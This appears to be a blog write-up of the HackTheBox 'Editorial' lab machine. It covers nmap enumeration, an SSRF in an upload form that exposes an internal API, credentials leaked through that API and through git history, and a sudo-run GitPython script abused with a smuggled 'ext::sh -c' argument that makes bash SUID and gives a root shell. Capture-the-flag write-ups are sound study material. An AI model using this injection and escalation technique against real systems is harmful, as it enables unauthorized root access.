---
title: "Editorial Writeup - HackTheBox"
date: 2024-10-09
draft: false
Tags:
- HackTheBox
- Linux
- Easy
---

| Link: | [https://app.hackthebox.com/machines/Editorial](https://app.hackthebox.com/machines/Editorial) |
| --- | --- |
| Difficulty | Easy |
| Machine | Linux |

---

## Enumeration

I ran nmap scan quickly on the target machine to reveal open ports on the box.

```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

I again ran agressive scan on the box on two open ports again using `sudo nmap 10.10.11.20 -T4 -vv -sC -sV -A -O` , following is result of the scan:

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=
|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://editorial.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

I added editorial.htb to my /etc/hosts file using command “`echo '10.10.11.20 editorial.htb' >> /etc/hosts`” and then visited `http://editorial.htb` the site looks like this:

![Untitled](Editorial%20430389d554fb45758990e424591fde42/Untitled.png)

## User Flag

There is `/upload` endpoint where we have upload functionality. We might get File Upload to RCE on this box. I will try to upload a reverse shell script to get a shell.

![Untitled](Editorial%20430389d554fb45758990e424591fde42/Untitled%201.png)

After bit of testing, the form field has cover url section which is actually vulnerable to SSRF and not file upload vulnerability in this website. 

The following request is vulnerable to SSRF where I will try to 

![Untitled](Editorial%20430389d554fb45758990e424591fde42/Untitled%202.png)

Upon testing on internal network, I found that there is port 5000 open on this box.

![Untitled](Editorial%20430389d554fb45758990e424591fde42/Untitled%203.png)

Visiting the port 5000 response i.e (`static/uploads/rrrrrrrr-eeee-zzzz-yyyyy-iscool`) reveals the api endpoint:

![Untitled](Editorial%20430389d554fb45758990e424591fde42/Untitled%204.png)

I visited the api endpoint and tried to open the file downloaded from the request recieved from the rsponse.

![Untitled](Editorial%20430389d554fb45758990e424591fde42/Untitled%205.png)

Upon visiting the endpoint given as by the request from above image, we get a file downloaded in our system. 

The file contains the username and password for user `dev`. Using SSH to the user and now we get user flag.

## Root Flag

There is a directory `/apps` which contains `.git` in home directory of the user dev.

```
dev@editorial:~$ ls
apps  lol.zip  user.txt
dev@editorial:~$ cd apps
dev@editorial:~/apps$ ls -la
total 24
drwxrwxr-x 6 dev dev 4096 Jun 16 08:17 .
drwxr-x--- 5 dev dev 4096 Jun 16 08:17 ..
drwxrwxr-x 2 dev dev 4096 Jun 16 08:13 app_api
drwxrwxr-x 4 dev dev 4096 Jun 16 08:10 app_editorial
drwxr-xr-x 8 dev dev 4096 Jun 16 08:09 .git
drwxrwxr-x 2 dev dev 4096 Mar  9  2021 GitDump-master
```

I will try to see logs:

```
dev@editorial:~/apps$ git log .
commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -> master)
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:04:21 2023 -0500

    fix: bugfix in api port endpoint

commit dfef9f20e57d730b7d71967582035925d57ad883
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 21:01:11 2023 -0500

    change: remove debug and update api port

commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev

    * To use development environment.

commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info

    * It (will) contains internal info about the editorial, this enable
       faster access to information.

commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:48:43 2023 -0500

    feat: create editorial app
```

Thee commit `b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae` shows that there is change in api downgrading from `prod` to `dev`. I will try to show the commit like this:

```
dev@editorial:~/apps$ git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:55:08 2023 -0500

    change(api): downgrading prod to dev
    
    * To use development environment.

diff --git a/app_api/app.py b/app_api/app.py
index 61b786f..3373b14 100644
--- a/app_api/app.py
+++ b/app_api/app.py
@@ -64,7 +64,7 @@ def index():
 @app.route(api_route + '/authors/message', methods=['GET'])
 def api_mail_new_authors():
     return jsonify({
-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: R3DACTED_PASSWORD\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: R3DACTEDPASSWORD!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
     }) # TODO: replace dev credentials when checks pass
 
 # -------------------------------

```

This has credential for both user `prod` and `dev`. Since we are already at user prod, we will change our user to `prod`.

```
dev@editorial:~/apps$ su prod
Password: 
prod@editorial:/home/dev/apps$ 
```

By using `sudo -l` i can see that this user prod can use `/usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *` as root and we wont be asked for password.

Below is the code for the python script `/opt/internal_apps/clone_changes/clone_prod_change.py`

```
prod@editorial:/home/dev/apps$ cat /opt/internal_apps/clone_changes/clone_prod_change.py
#!/usr/bin/python3

import os
import sys
from git import Repo

os.chdir('/opt/internal_apps/clone_changes')

url_to_clone = sys.argv[1]

r = Repo.init('', bare=True)
r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
```

This script changes the working directory to `/opt/internal_apps/clone_changes`, initializes a bare Git repository, and clones the repository specified by `url_to_clone` into a subdirectory named `new_changes` with a specific Git configuration option.

Doing few research there is RCE vulnerability for this. If you are interested reading you can read [here](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858).

I will use this script to make /bin/bash suid binary and then use it to get root shell.

I ran `sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c chmod% u+s% /bin/bash'`

Although I got errors, it successfully made it suid binary. I simply then ran `/bin/bash -p` to get root shell.

```
prod@editorial:~$ /bin/bash -p
bash-5.1# id
uid=1000(prod) gid=1000(prod) euid=0(root) groups=1000(prod)
```

There we go. We rooted this box successfully.

## Conclusion

Thanks for following my writeup. Follow my blogs for more. :D
